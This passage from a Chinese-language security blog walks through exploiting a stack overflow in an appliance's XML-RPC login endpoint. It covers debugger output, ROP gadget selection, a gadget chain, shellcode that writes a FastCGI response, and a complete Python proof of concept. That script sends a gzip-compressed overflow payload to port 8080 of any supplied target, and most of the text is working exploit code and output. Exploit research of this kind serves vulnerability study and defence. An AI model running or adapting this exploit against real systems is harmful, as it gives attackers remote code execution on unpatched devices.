[stack] : 0x7ffcdf15320d (&quot;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/valu&quot;...)
[stack] : 0x7ffcdf15321f (&quot;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&quot;...)
</code></pre>
<p>监视回调的堆地址，等待它被覆盖，但发现回调被覆盖时，显示的值为<code>0xcd1cf040</code></p>
<figure data-type="image" tabindex="17"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627155631358.png?x-oss-process=style/zip" alt="image-20240627155631358" loading="lazy"></figure>
<p>重启后发现这里的值变化了</p>
<figure data-type="image" tabindex="18"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627163913507.png?x-oss-process=style/zip" alt="image-20240627163913507" loading="lazy"></figure>
<p>这里思考之前的溢出问题，直接使用大量的A造成溢出，断在了libc.so.6中</p>
<figure data-type="image" tabindex="19"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627175256865.png?x-oss-process=style/zip" alt="image-20240627175256865" loading="lazy"></figure>
<p>尝试构造合适的payload</p>
<p>尝试寻找gadgets，但没有找到合适的，最后发现生成的gadgets有问题</p>
<h4 id="问题">问题</h4>
<ul>
<li>gadgets中地址与GDB中调试显示地址不一致</li>
<li>gadgets中无可用gadget</li>
</ul>
<p>结果：</p>
<ul>
<li>基地址问题</li>
<li>二进制文件错误</li>
</ul>
<h3 id="寻找-rop-chains">寻找 ROP Chains</h3>
<p>在解决了gadgets问题后，重新搜索合适的指令，通过分析下面的大部分抬栈指令都是可以用的：</p>
<figure data-type="image" tabindex="20"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628130045725.png?x-oss-process=style/zip" alt="image-20240628130045725" loading="lazy"></figure>
<p>因为要当作标签传入<code>XML</code>，这里选择了</p>
<pre><code>0x000000000041464d : ret 0x90be
</code></pre>
<p><code>0x41464d</code>转为字符串是<code>AFM</code>，因为这是一个小端系统，最后应该是<code>MFA</code></p>
<h3 id="rop-链编写">ROP 链编写</h3>
<p>这里看了一下，栈地址空间是有执行权限的</p>
<pre><code>gdb-peda$ xinfo 0x7ffc167d5000
0x7ffc167d5000 --&gt; 0x0 
Virtual memory mapping:
Start : 0x00007ffc167d5000
End   : 0x00007ffc167f5000
Offset: 0x0
Perm  : rwxp
Name  : [stack]
</code></pre>
<p>接下来写ROP 利用链就是要计算出当前堆栈的地址，并进行 jmp 跳转执行上面的 shellcode</p>
<h4 id="抬栈找到-rop-链">抬栈找到 ROP 链</h4>
<p>通过 <code>ret 0x90be</code>，操作将 esp 增加 <code>25328</code> 个字节，我们只需将 ROP 链放在这个位置即可，为了准确在这个位置，我们需要控制  <code>&lt;BBBBXNA&gt;</code>  的重复次数。经过简单的计算，重复 <code>2376</code> 次加上两个字节，在经过 <code>libxml</code> 剩下代码的操作就可以顺利到达可控的 ROP 区域。</p>
<figure data-type="image" tabindex="21"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628144024827.png?x-oss-process=style/zip" alt="image-20240628144024827" loading="lazy"></figure>
<p>这里发现单纯多加一个A不行</p>
<figure data-type="image" tabindex="22"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628144301076.png?x-oss-process=style/zip" alt="image-20240628144301076" loading="lazy"></figure>
<p>可以成功跳转</p>
<figure data-type="image" tabindex="23"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627165600396.png?x-oss-process=style/zip" alt="image-20240627165600396" loading="lazy"></figure>
<h4 id="执行-libxml-中的代码">执行 libxml 中的代码</h4>
<p>执行完 <code>ret</code> 操作后，会继续执行 libxml2.so 中的代码，该部分代码同样也会对栈空间进行操作，需要考虑偏移</p>
<pre><code>0x7f37bfee24a4:	add    rsp,0x20
0x7f37bfee24a8:	mov    ecx,DWORD PTR [rsp+0x3c]
0x7f37bfee24ac:	test   ecx,ecx
0x7f37bfee24ae:	jne    0x7f37bfee26bb
0x7f37bfee24b4:	mov    rax,QWORD PTR [rsp+0x10]
0x7f37bfee24b9:	add    rsp,0x88
0x7f37bfee24c0:	pop    rbx
0x7f37bfee24c1:	pop    rbp
0x7f37bfee24c2:	pop    r12
0x7f37bfee24c4:	pop    r13
0x7f37bfee24c6:	pop    r14
0x7f37bfee24c8:	pop    r15
0x7f37bfee24ca:	ret
</code></pre>
<figure data-type="image" tabindex="24"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628184340965.png?x-oss-process=style/zip" alt="image-20240628184340965" loading="lazy"></figure>
<h4 id="构造-rop-链">构造 ROP 链</h4>
<p>使用p64</p>
<figure data-type="image" tabindex="25"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240701173603401.png?x-oss-process=style/zip" alt="image-20240701173603401" loading="lazy"></figure>
<pre><code>从堆栈中弹出 2 个字节并跳转
0x40f968:	ret    0x2

跳到下一个gadget
0x405020:	ret

将位于 0x41d611 的gadget弹出到 rax 中。
0x41d60e:	pop    rax
0x41d60f:	pop    rbx
0x41d610:	pop    rbp
0x41d611:	ret

将栈指针保存在rbp中，然后调用之前弹出到rax中的gadget。
0x405e7d:	mov    rbp,rsp
0x405e80:	call   rax

从栈中移除两个值
0x41d5b1:	pop    rsi
0x41d5b2:	pop    r15
0x41d5b4:	ret

将包含栈针的rbp推到栈上
0x405e7c:	push   rbp
0x405e7d:	mov    rbp,rsp
0x405e80:	call   rax

从栈中移除两个值
0x41d5b1:	pop    rsi
0x41d5b2:	pop    r15
0x41d5b4:	ret

把之前推的栈址加载到rdx里，并把它复制到rsi
0x41d2ad:	lea    rdx,[rbp-0x80]
0x41d2b1:	mov    rsi,rdx
0x41d2b4:	mov    rdi,rcx
0x41d2b7:	call   rax

从栈中移除两个值
0x41d5b1:	pop    rsi
0x41d5b2:	pop    r15
0x41d5b4:	ret

0xc0弹到rax，堆栈指针加192字节。
0x41d60e:	pop    rax
0x41d60f:	pop    rbx
0x41d610:	pop    rbp
0x41d611:	ret

把指向栈的rdx复制到rax，然后跳转。
0x40a92a:	add    rax,rdx
0x40a92d:	jmp    rax

执行shellcode。
0x7ffd5782ca68:	nop
</code></pre>
<figure data-type="image" tabindex="26"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628184601732.png?x-oss-process=style/zip" alt="image-20240628184601732" loading="lazy"></figure>
<figure data-type="image" tabindex="27"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628184655166.png?x-oss-process=style/zip" alt="image-20240628184655166" loading="lazy"></figure>
<p>看到一种比较不同的漏洞利用验证方法，不是传统的<code>getshell</code>验证，学习了一下</p>
<p>它的目标是：</p>
<ul>
<li>相对无侵入性，最小化系统更改，做到更隐蔽</li>
<li>一致性，即要求可重复、稳定、可靠</li>
<li>不依赖回调基础设施，即尽量不传数据到自己的机器上</li>
</ul>
<p>网上比较常见的并且在这个漏洞中也有其他人使用的方法是向磁盘写文件，并抛出一个反向 shell，针对这个情况，它的想法是：</p>
<ul>
<li>本来的漏洞利用即是通过 HTTP 请求来进行的</li>
<li>如果能够劫持HTTP响应，并且写入一个唯一值</li>
<li>最后成功在响应中检测到该唯一值，就可以确认漏洞利用成功。</li>
</ul>
<h3 id="劫持响应">劫持响应</h3>
<p>首先是想利用<code>strace</code>，这个工具能够允许用户查看进程的系统调用、信号传递和进程间通信。</p>
<p>因为没找到直接编译好的静态文件，编译又相对繁琐，我尝试编译了一下，架构不同没能成功，需要对应架构的虚拟机编译，这个有点麻烦，直接找了网上现有的响应分析</p>
<pre><code>write(9, &quot;\1\6\0\1\1]\3\0Content-type: text/xml\r\n\r\n&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&lt;methodResponse&gt;\n &lt;fault&gt;&lt;value&gt;&lt;struct&gt;\n  &lt;member&gt;\n   &lt;name&gt;faultCode&lt;/name&gt;\n   &lt;value&gt;&lt;int&gt;401&lt;/int&gt;&lt;/value&gt;\n  &lt;/member&gt;\n  &lt;member&gt;\n   &lt;name&gt;faultString&lt;/name&gt;\n   &lt;value&gt;&lt;string&gt;invalid credentials or user doesn&amp;apos;t exist&lt;/string&gt;&lt;/value&gt;\n  &lt;/member&gt;\n &lt;/struct&gt;&lt;/value&gt;&lt;/fault&gt;\n&lt;/methodResponse&gt;\n\0\0\0&quot;, 360) = 360

write(9, &quot;\1\6\0\1\0\0\0\0\1\3\0\1\0\10\0\0\0\0\0\0\0\0\0\0&quot;, 24) = 24
</code></pre>
<p>观察到响应的格式基本相同，都是一些二进制数据加一些<code>HTML</code>，通过文件描述符9写入</p>
<p>并且由于这个进程使用<code>FCGI</code>，上面的数据同<code>FCGI</code>的一个响应结构很符合</p>
<pre><code>typedef struct {
   unsigned char version;                    // 0x01
   unsigned char type;                       // 0x06 (FCGI_STDOUT)
   unsigned char requestIdB1;                // 0x00
   unsigned char requestIdB0;                // 0x01
   unsigned char contentLengthB1;            // 0x01
   unsigned char contentLengthB0;            // ]
   unsigned char paddingLength;              // 0x03
   unsigned char reserved;                   // 0x00
   unsigned char contentData[contentLength]; // Content-type: text/xml...
   unsigned char paddingData[paddingLength]; // 0x000000
} FCGI_Record;
</code></pre>
<p>下面的工作就是写<code>shellcode</code>来执行<code>syscall</code>，通过它写一个测试值</p>
<h3 id="shellcode">shellcode</h3>
<pre><code>mov    rdx,0x30     ; 字符串长度
mov    rsi,rsp      ；write 系统调用的第二个参数，把当前栈指针 rsp 的值赋给寄存器 rsi
add    rsi,0x38     ; 指向准备好的FastCGI 记录的起始位置
mov    rdi,0x9      ;  write 系统调用第一个参数
mov    rax,0x1      ;  write 系统调用号
syscall
mov    rax,0x3c     ; exit系统调用号
mov    rdi,0x0      ; exit 系统调用第一个参数
syscall
</code></pre>
<p>完整poc</p>
<pre><code>#!/usr/bin/env python3

import socket
import ssl
import gzip
import sys

def build_payload():
    # xml overflow payload
    payload  = b''
    payload += b'&lt;methodCall&gt;&lt;methodName&gt;agent.login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;value&gt;&lt;'
    payload += b'A'*3181
    payload += b'MFA&gt;'
    payload += b'&lt;BBBBMFA&gt;'*3680

    # padding and rop chain
    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 P@\x00\x00\x00\x00\x00h\xf9@\x00\x00\x00\x00\x00 P@\x00\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xb1\xd5A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}^@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|^@\x00\x00\x00\x00\x00\xad\xd2A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00*\xa9@\x00\x00\x00\x00\x00'

    # shell code
    payload += b'\x48\xC7\xC2\x30\x00\x00\x00'  # mov rdx,0x30
    payload += b'\x48\x89\xE6'                  # mov rsi,rsp
    payload += b'\x48\x83\xC6\x2e'              # add rsi,0x2e
    payload += b'\x48\xC7\xC7\x09\x00\x00\x00'  # mov rdi,0x9
    payload += b'\x48\xC7\xC0\x01\x00\x00\x00'  # mov rax,0x1 
    payload += b'\x0f\x05'                      # syscall
    payload += b'\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax,0x3c
    payload += b'\x48\xc7\xc7\x00\x00\x00\x00'  # mov rdi,0x0
    payload += b'\x0f\x05'                      # syscall

    # http response
    payload += b'\x01'      # fcgi version
    payload += b'\x06'      # fcgi type (stdout)
    payload += b'\x00\x01'  # fcgi request id
    payload += b'\x00\x3c'  # content length
    payload += b'\x00'      # padding length
    payload += b'\x00'      # reserved
    payload += b'Content-Type: text/plain\r\n\r\nPewPewPewPew'

    return gzip.compress(payload, 9)

def build_post_request(target):
    payload = build_payload()

    request  = ''
    request += 'POST /agent/login HTTP/1.1\r\n'
    request += 'Host: {}:8080\r\n'.format(target)
    request += 'Content-Encoding: gzip\r\n'
    request += 'Content-Length: {}\r\n'.format(len(payload))
    request += '\r\n'

    return request.encode() + payload

if __name__ == '__main__':
    TARGET = sys.argv[1]

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = ssl.wrap_socket(sock=sock, cert_reqs=ssl.CERT_NONE)

    print('connecting to {} port {}'.format(TARGET, 8080))
    ssl_sock.connect((TARGET, 8080))

    print ('发送 payload...')
    request = build_post_request(TARGET)
    ssl_sock.send(request)

    print('收到...')
    print(ssl_sock.recv())
</code></pre>
<p>可以看到也是成功了</p>
<figure data-type="image" tabindex="28"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240704140518607.png?x-oss-process=style/zip" alt="image-20240704140518607" loading="lazy"></figure>

                </div>
            </article>
        </div>

        
            <div class="next-post">
                <div class="next gt-c-content-color-first">下一篇</div>
                <a href="https://blog.augustu.top/post/cve-2024-21762-fortigate/" class="post-title gt-a-link">
                    CVE-2024-21762 FortiGate
                </a>
            </div>
        

        

        

        

        <div class="site-footer gt-c-content-color-first">
    <div class="slogan gt-c-content-color-first">吾不识青天高，黄地厚<br> 
唯见月寒日暖，来煎人寿</div>
    <div class="social-container">
        
            
        
            
        
            
        
            
        
            
        
            
        
    </div>
    <div class="footer-info">
        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
    </div>
    <div>
        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://blog.augustu.top/atom.xml" target="_blank">RSS</a>
    </div>
</div>

<script>
  hljs.highlightAll()
</script>

    </div>
</div>
</body>
</html>
